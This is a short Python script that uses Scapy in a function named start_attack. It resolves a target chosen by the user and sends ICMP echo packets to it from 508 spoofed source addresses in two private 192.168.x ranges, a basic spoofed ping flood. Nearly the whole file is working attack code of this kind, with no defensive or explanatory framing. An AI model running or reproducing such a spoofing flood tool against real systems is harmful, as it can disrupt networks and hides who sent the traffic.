import ipaddress
import socket
from scapy.all import ICMP, IP, send
import itertools
from urllib.parse import urlparse
import base64


# import scapy.all as scapy

# https://scapy.readthedocs.io/en/latest/usage.html#stacking-layers
# ICMP Echo Request packets = ping


def is_ip(ip):  # checks if ip is valid

    try:
        ipaddress.ip_address(ip)  # validates both IPv4 and IPv6
        return True
    except ValueError:
        return False


def get_default_port(url):
    # Returns the default port for HTTP or HTTPS based on the URL.
    parsed_url = urlparse(url)
    if parsed_url.scheme == "https":
        return 443
    else:  # Default to HTTP if no HTTPS
        return 80


def is_domain(domain):  # checks if domain is valid
    domain = urlparse(domain).hostname or domain
    try:
        # Attempt to resolve the domain to an IP address
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return False


def generate_ip_chain(base_ip1, base_ip2):
    # Convert the base IP addresses to IPv4Address objects
    base_ip_obj1 = ipaddress.IPv4Address(base_ip1)
    base_ip_obj2 = ipaddress.IPv4Address(base_ip2)
    count = 254

    # Use itertools.chain to concatenate two IP ranges
    ip_list = list(itertools.chain(
        (str(base_ip_obj1 + i) for i in range(count)),  # First range
        (str(base_ip_obj2 + i) for i in range(count))   # Second range
    ))

    return ip_list


def encode_domain(domain):

    return base64.b64encode(domain.encode()).decode()


def start_attack():
    try:
        # Get target IP or domain
        user_input = input("Choose IP address or domain: ")
        target = is_domain(user_input)

        while not target:
            user_input = input("Choose correct IP address or domain: ")
            target = is_domain(user_input)
        domain = encode_domain(target)

        base_ip1 = "192.168.17.0"
        base_ip2 = "192.168.18.0"
        ip_list = generate_ip_chain(base_ip1, base_ip2)
        for ip in ip_list:
            send(
                IP(src=ip, dst=target) / ICMP()
            )  # setup of a packet
        print(f"\nshhh... sent to {domain}")
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt")
        exit()


if __name__ == "__main__":
    start_attack()
